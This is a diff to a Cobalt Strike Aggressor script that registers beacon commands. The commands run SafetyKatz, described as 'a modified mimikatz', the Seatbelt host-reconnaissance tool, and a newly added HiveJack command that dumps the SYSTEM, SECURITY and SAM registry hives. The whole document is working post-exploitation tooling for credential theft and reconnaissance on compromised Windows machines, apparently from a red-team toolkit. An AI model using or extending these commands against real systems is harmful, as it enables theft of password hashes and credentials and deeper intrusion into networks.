@@ -1,13 +1,13 @@
-alias Safetykatz{
+alias safetykatz{
     bexecute_assembly($1, script_resource("post/SafetyKatz.exe"), "");
 }
 beacon_command_register(
-	"Safetykatz", 
+	"safetykatz", 
 	"it's a modified mimikatz", 
 	"");
 
 
-alias Seatbelt{
+alias seatbelt{
     if ($2 eq "system"){
         bexecute_assembly($1, script_resource("post/Seatbelt.exe"), "system");
     }
@@ -28,6 +28,22 @@ alias Seatbelt{
     }
 }
 beacon_command_register(
-	"Seatbelt", 
+	"seatbelt", 
 	"Gather system, user and other informations on the target.", 
 	"");
+
+
+alias hivejack{
+    local('@args_list $args');
+    $args = "";
+    @args_list = sublist(@_, 1);
+    foreach $arg (@args_list){
+        $args .= $arg . " ";
+    }
+    bexecute_assembly($1, script_resource("post/HiveJack-Console.exe"), $args);
+}
+
+beacon_command_register(
+    "hivejack",
+    "dump SYSTEM, SECURITY and SAM registry hives",
+    "");
